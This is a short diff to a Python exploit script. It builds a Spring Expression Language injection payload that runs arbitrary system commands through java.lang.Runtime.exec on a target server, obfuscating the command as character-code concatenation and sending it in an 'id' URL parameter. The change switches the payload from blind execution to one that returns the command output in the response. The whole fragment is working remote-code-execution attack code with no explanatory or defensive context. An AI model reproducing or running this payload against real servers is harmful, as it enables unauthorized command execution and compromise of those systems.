@@ -12,8 +12,8 @@ def encode(cmd):
 	for ch in cmd[1:]:
 		result = result + '.concat(T(java.lang.Character).toString(%s))' % ord(ch)
 
-	return '${T(java.lang.Runtime).getRuntime().exec(' + result + ')}'
-	# return '${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(' + result + ').getInputStream())}'
+	# return '${T(java.lang.Runtime).getRuntime().exec(' + result + ')}'
+	return '${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(' + result + ').getInputStream())}'
 
 def run(url, cmd):
 	resp = requests.get('{}/?id={}'.format(url, encode(cmd)), headers = {'Accept': 'text/html'})
